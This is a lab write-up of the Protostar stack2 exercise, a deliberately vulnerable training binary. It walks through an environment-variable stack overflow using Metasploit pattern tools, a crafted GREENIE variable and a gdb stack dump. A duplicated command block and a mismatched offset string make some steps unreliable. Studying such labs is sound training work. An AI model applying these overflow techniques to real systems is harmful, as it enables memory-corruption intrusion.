Stack2 extends Stack1 by demonstrating that values read by the vulnerable application 
can also be read from environment variables.  This is important because you can't always
store the shellcode you want directly in the stack, but you might be able
to store it in a variable and point your return statement to the address of the variable
instead of somewhere within the stack.

Let's use metasploit again to make a nice big string for us to test the size
of the environment variable for this case.  We'll be working in a bash shell
within the protostar environment.

```
﻿root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb 128Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
```

Now for the environment variable

```
﻿root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb 128Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
```

Then run the exploit

```
﻿user@protostar:/opt/protostar/bin$ ./stack2
Try again, you got 0x63413163
Segmentation fault
```

Remembering that this a little endian system, we need to convert the hex to ascii
and run it through metasploit to get our offset

Using this handy [ASCII/DEC/HEX Chart](../resources/Hex2Ascii.md) we'll convert
**63 31 41 63** and find that we now have **cA1c**

Within meterpreter we have the following results.

```
﻿root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb c1Ac
[*] Exact match at offset 64
```

This lesson is asking for **0D 0A 0D 0A**. While these characters aren't covered in the chart, they refer to
carriage return and line feed.  This poses a special challenge as not only are these
non-printable characters, they're not much different from "pressing enter."
So, how do we get "I pressed enter" into a variable without actually pressing enter?
With a little ingenuity we can make this work.  We also need to enter these
characters in in little-endian format so that when they're placed on the stack, they're in the right order.

First, we can go ahead and generate the first 64 characters we need for the string.

In Kali: 

```
﻿root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb 64
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
```

Now, in protostar we're going to create a special variable which is actually a system call to echo.
Using the **-e** flag makes the echo command interpret \r and \n as the carriage return and linefeed we need.
That variable looks like

```
﻿user@protostar:/opt/protostar/bin$ export foo=`echo -e "\n\r\n\r"`
```

If we examine this at the CLI we see that $foo does indeed appear to be unprintable characters

```
﻿user@protostar:/opt/protostar/bin$ echo $foo

```

And if we concatenate that onto our string as such


```
﻿user@protostar:/opt/protostar/bin$ export GREENIE="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A${foo}"
```

The results are exactly as needed

```
﻿user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```

To prove this, we'll examine the stack using gdb.

Since I'm pretty rusty with gdb this I'll take an extreme approach to finding the data.

The steps are

- load stack2 in gdb
- set a breakpoint at exit with "break exit"
- examine the very top of the stack (crudely using 1000 before stack pointer as a guess) which is where variables are held
- profit?

```
﻿user@protostar:/opt/protostar/bin$ gdb ./stack2
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack2...done.
(gdb) break exit
Function "exit" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 1 (exit) pending.
(gdb) run
Starting program: /opt/protostar/bin/stack2 
you have correctly modified the variable

Breakpoint 1, *__GI_exit (status=41) at exit.c:100
100	exit.c: No such file or directory.
	in exit.c

﻿(gdb) x/1000x $sp 
0xbffff730:	0x39624138	0x41306341	0x0d0a0d0a	0xbffff900
0xbffff740:	0xb7ec60c9	0xb7fd7ff4	0xbffff7c8	0xb7eadc7e
0xbffff750:	0x00000029	0xbffff7f4	0xbffff7fc	0xb7fe1848
0xbffff760:	0xbffff7b0	0xffffffff	0xb7ffeff4	0x0804829c
0xbffff770:	0x00000001	0xbffff7b0	0xb7ff0626	0xb7fffab0
0xbffff780:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
0xbffff790:	0xbffff7c8	0x7acdc44d	0x509b125d	0x00000000
0xbffff7a0:	0x00000000	0x00000000	0x00000001	0x080483e0
0xbffff7b0:	0x00000000	0xb7ff6210	0xb7eadb9b	0xb7ffeff4
0xbffff7c0:	0x00000001	0x080483e0	0x00000000	0x08048401
0xbffff7d0:	0x08048494	0x00000001	0xbffff7f4	0x08048530
0xbffff7e0:	0x08048520	0xb7ff1040	0xbffff7ec	0xb7fff8f8
0xbffff7f0:	0x00000001	0xbffff919	0x00000000	0xbffff933
0xbffff800:	0xbffff93d	0xbffff95e	0xbffff972	0xbffff97a
0xbffff810:	0xbffff98a	0xbffff993	0xbffff9a5	0xbffff9b8
0xbffff820:	0xbffffa05	0xbffffa12	0xbffffa21	0xbffffa2d
0xbffff830:	0xbffffa41	0xbffffa7f	0xbffffa90	0xbfffff80
0xbffff840:	0xbfffff8e	0xbfffffa5	0xbfffffd9	0x00000000
0xbffff850:	0x00000020	0xb7fe2414	0x00000021	0xb7fe2000
0xbffff860:	0x00000010	0x078bfbff	0x00000006	0x00001000
0xbffff870:	0x00000011	0x00000064	0x00000003	0x08048034
0xbffff880:	0x00000004	0x00000020	0x00000005	0x00000007
0xbffff890:	0x00000007	0xb7fe3000	0x00000008	0x00000000
```

As you can see, right at the top of the memory range are the hex characters I was looking for
at **0xbffff738 through 0xbffff73b**  You'll also find in 0xbffff730 through 0xbffff737 the characters

**9bA8 A0cA** which represent the little-endian **8Ab9 Ac0A** which, if you refer to the 
characters I used to fill the variable, were right before the carriage return line feeds.


Move on to [Stack3](../stack3/)